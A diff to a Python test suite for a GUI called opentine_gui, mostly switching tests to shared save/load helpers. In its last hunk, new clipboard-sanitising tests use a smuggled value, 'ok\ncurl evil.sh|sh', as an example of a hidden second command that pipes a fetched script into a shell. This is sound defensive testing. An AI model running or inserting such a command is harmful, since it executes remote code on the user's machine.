@@ -33,6 +33,7 @@ from opentine_gui.inspectors import (
 )
 from opentine_gui.text import _oneline, _sanitize
 from opentine_gui.trust import TrustConfig, coverage_lines, load_trust_config
+from tests.artifacts import dump_doc, load_doc, save_v2
 
 
 def _run(run_id: str = "abc", **fields) -> Run:
@@ -345,23 +346,23 @@ def test_a_save_that_would_drop_an_unreadable_field_says_so(tmp_path: Path) -> N
     from opentine_gui.sources import _fields_a_save_would_drop
 
     path = tmp_path / "abc.tine"
-    _run().save(path)
+    save_v2(_run(), path)
     assert _fields_a_save_would_drop(path) == ()
 
-    raw = json.loads(path.read_text())
+    raw = load_doc(path)
     step = next(iter(raw["graph"]["steps"].values()))
     step["future_field"] = "written by a newer opentine"
-    path.write_text(json.dumps(raw))
+    dump_doc(path, raw)
     assert _fields_a_save_would_drop(path) == ("future_field",)
 
 
 def test_the_write_confirmation_names_what_would_be_lost(tmp_path: Path, gui_factory) -> None:
     path = tmp_path / "abc.tine"
     running = _run(status=RunStatus.running)
-    running.save(path)
-    raw = json.loads(path.read_text())
+    save_v2(running, path)
+    raw = load_doc(path)
     next(iter(raw["graph"]["steps"].values()))["provider"] = "anthropic"
-    path.write_text(json.dumps(raw))
+    dump_doc(path, raw)
 
     from opentine.core import Step
 
@@ -454,10 +455,10 @@ def test_a_run_level_field_this_opentine_cannot_read_is_named_before_a_save(
     from opentine_gui.sources import _fields_a_save_would_drop
 
     path = tmp_path / "abc.tine"
-    _run().save(path)
-    raw = json.loads(path.read_text())
+    save_v2(_run(), path)
+    raw = load_doc(path)
     raw["attestations"] = [{"claim": "reviewed"}]
-    path.write_text(json.dumps(raw))
+    dump_doc(path, raw)
     assert _fields_a_save_would_drop(path) == ("attestations",)
 
 
@@ -574,3 +575,25 @@ def test_a_repository_object_corrupted_under_an_open_console_is_noticed(tmp_path
     second = source.scan()
     assert second.entries == []
     assert any("malformed" in error or "object" in error for error in second.errors)
+
+
+def test_an_id_with_control_characters_is_never_copied(
+    gui_factory, fake_dpg, tmp_path: Path
+) -> None:
+    # The panel shows an id flattened, but the clipboard would carry it raw:
+    # "x\ncurl evil|sh" pasted into a shell runs the second line.
+    gui = gui_factory(tmp_path)
+    copied: list[str] = []
+    gui._copy_to_clipboard = lambda value, label: copied.append(value)
+    gui._copy_id("ok\ncurl evil.sh|sh", "run id")
+    gui._copy_id("ok\x1b[2J", "run id")
+    assert copied == []
+    gui._copy_id("event:sha256:abc", "step id")
+    assert copied == ["event:sha256:abc"]
+
+
+def test_sanitize_strips_terminal_escapes_but_keeps_line_structure() -> None:
+    from opentine_gui.text import _sanitize
+
+    assert _sanitize("a\x1b[31mb\x07\nc\td") == "a[31mb\nc\td"
+    assert _sanitize("é\x1b") == "é"
